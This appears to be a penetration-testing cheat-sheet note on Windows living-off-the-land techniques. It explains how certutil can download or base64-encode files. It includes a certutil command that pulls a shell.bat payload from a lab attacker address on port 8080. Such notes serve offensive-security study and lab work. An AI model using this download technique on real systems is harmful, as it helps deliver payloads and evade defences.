---
tags: [privesc, windows, lotl]
aliases: [Living Off the Land]
---

The LOLBAS project documents binaries, scripts, and libraries that can be used for "living off the land" techniques on Windows systems. 

# Certutil

Intended use is for handling certificates but can also be used to transfer files by either downloading a file to disk or base64 encoding/decoding a file.

```powershell
certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat

# encoding a file
certutil -encode file1 encodedfile

# decoding a file
certutil -decode encodedfile file2
```

## Related

- [[windows]]
- [[06-post-exploitation/credential-access/credential-hunting|Credential Hunting]]
- [[06-post-exploitation/file-transfer/linux|Linux]]
- [[pillaging]]

